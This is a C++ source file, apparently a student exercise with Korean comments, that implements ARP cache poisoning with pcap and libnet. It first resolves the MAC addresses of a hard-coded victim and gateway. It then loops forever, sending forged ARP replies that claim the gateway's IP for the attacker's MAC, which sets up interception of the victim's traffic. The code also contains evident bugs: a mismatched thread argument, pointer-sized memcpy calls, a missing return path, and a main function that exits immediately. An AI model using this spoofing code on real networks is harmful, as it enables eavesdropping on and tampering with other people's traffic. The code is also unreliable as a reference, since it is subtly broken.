#include <stdio.h>
#include <cstring>
#include <cstdlib>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <thread>

u_char my_mac[] = {0x24, 0xf5, 0xaa, 0x75, 0xa4, 0xdf};
u_int8_t my_ip[] = {0xc0, 0xa8, 0xc8, 0x7b};
u_char brod_eth_mac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
u_int8_t brod_arp_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
u_int8_t sender_ip[] = {0xc0, 0xa8, 0xc8, 0x85};
u_int8_t receiver_ip[] = {0xc0, 0xa8, 0xc8, 0xfe};


struct eth_hdr {
    u_int8_t eth_dmac[6];   // ether destination mac주소
    u_int8_t eth_smac[6];  // ether source mac주소
    u_int16_t eth_type;   // ether type
};
struct arp_req {
    u_int16_t arp_hwtype;   // ARP 패킷의 하드웨어 타입
    u_int16_t arp_protype;  // ARP 패킷의 프로토콜 타입
    u_int8_t arp_hlen;   // ARP 패킷의 하드웨어 길이
    u_int8_t arp_plen;   // ARP 패킷의 프로토콜 길이
    u_int16_t arp_opr;   // ARP 패킷의 오퍼레이션
    u_int8_t arp_shwaddr[6];  // ARP 패킷의 소스MAC주소
    u_int8_t arp_sipaddr[4]; // ARP 패킷의 소스IP주소
    u_int8_t arp_thwaddr[6];   // ARP 패킷의 타겟MAC주소
    u_int8_t arp_tproaddr[4]; // ARP 패킷의 타겟IP주소
};

struct eth_arp_req {
    eth_hdr eth;
    arp_req arp;
};

u_int8_t *reply_mac(const u_char *packet);
void arp_infection(pcap_t *handle, u_int8_t *sender_mac, u_int8_t *receiver_mac);

int main()
{
    const u_char *packet;
    struct pcap_pkthdr pcap_header;
    u_int8_t *sender_mac;
    u_int8_t *receiver_mac;
    pcap_t *handle;
    char *dev = "wlan0";
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    eth_hdr eth;
    memcpy(eth.eth_dmac, brod_eth_mac, sizeof(brod_eth_mac));
    memcpy(eth.eth_smac, my_mac, sizeof(my_mac));
    eth.eth_type = htons(ETH_P_ARP);
    arp_req arp;
    arp.arp_hwtype = htons(ARPHRD_ETHER);
    arp.arp_protype = htons(ETH_P_IP);
    arp.arp_hlen = sizeof(eth.eth_dmac);
    arp.arp_plen = sizeof(arp.arp_sipaddr);
    arp.arp_opr = htons(ARPOP_REQUEST);
    memcpy(arp.arp_shwaddr, my_mac, sizeof(my_mac));
    memcpy(arp.arp_sipaddr, my_ip, sizeof(my_ip));
    memcpy(arp.arp_thwaddr, brod_arp_mac, sizeof(brod_arp_mac));
    memcpy(arp.arp_tproaddr, sender_ip, sizeof(sender_ip));

    eth_arp_req req;
    req.eth = eth;
    req.arp = arp;

        if (pcap_sendpacket(handle,(const u_char*)&req ,(sizeof(req))) != 0)
        {
            printf("arp error\n");
        }
        else
        {
            printf("arp send\n");
            packet = pcap_next(handle,&pcap_header);
            sender_mac=reply_mac(packet);
        }

        memcpy(arp.arp_tproaddr, receiver_ip, sizeof(receiver_ip));
        req.eth = eth;
        req.arp = arp;

        if (pcap_sendpacket(handle,(const u_char*)&req ,(sizeof(req))) != 0)
        {
            printf("arp error\n");
        }
        else
        {
            printf("arp send\n");
            packet = pcap_next(handle,&pcap_header);
            receiver_mac=reply_mac(packet);
        }
        std::thread(arp_infection, handle, sender_mac, sender_ip).detach();
}

u_int8_t *reply_mac(const u_char *packet)
{
    char buf[24];
    libnet_ethernet_hdr *ethernet_hdr = (libnet_ethernet_hdr *) packet;
    if(ntohs(ethernet_hdr->ether_type) == ETHERTYPE_ARP)
    {
        libnet_arp_hdr *arp_hdr = (libnet_arp_hdr *)(packet + sizeof(libnet_ethernet_hdr));
        if((ntohs(arp_hdr->ar_op) == ARPOP_REPLY))
        {
            printf("sender mac -> %s\n", ether_ntoa_r((ether_addr*)ethernet_hdr->ether_shost, buf));
            return(ethernet_hdr->ether_shost);
        }
    }
}

void arp_infection(pcap_t *handle, u_int8_t *sender_mac, u_int8_t *receiver_mac)
{
    eth_hdr eth_h;
    memcpy(eth_h.eth_dmac, sender_mac, sizeof(sender_mac));//감염시킬 sender의 mac
    memcpy(eth_h.eth_smac, my_mac, sizeof(my_mac));
    eth_h.eth_type = htons(ETH_P_ARP);
    arp_req arp_h;
    arp_h.arp_hwtype = htons(ARPHRD_ETHER);
    arp_h.arp_protype = htons(ETH_P_IP);
    arp_h.arp_hlen = sizeof(eth_h.eth_dmac);
    arp_h.arp_plen = sizeof(arp_h.arp_sipaddr);
    arp_h.arp_opr = htons(ARPOP_REPLY);
    memcpy(arp_h.arp_shwaddr, my_mac, sizeof(my_mac));
    memcpy(arp_h.arp_sipaddr, receiver_ip, sizeof(receiver_ip));//gateway의 ip
    memcpy(arp_h.arp_thwaddr, sender_mac, sizeof(sender_mac));//감염시킬 sender의 mac
    memcpy(arp_h.arp_tproaddr, sender_ip, sizeof(sender_ip));//감염시킬 sender의 ip

    eth_arp_req infect;
    infect.eth = eth_h;
    infect.arp = arp_h;

    while(true)
    {
        if (pcap_sendpacket(handle,(const u_char*)&infect ,(sizeof(infect))) != 0)
        {
            printf("arp error\n");
        }
        else
        {
            printf("arp send\n");
        }
        sleep(1);
    }
    pcap_close(handle);
}
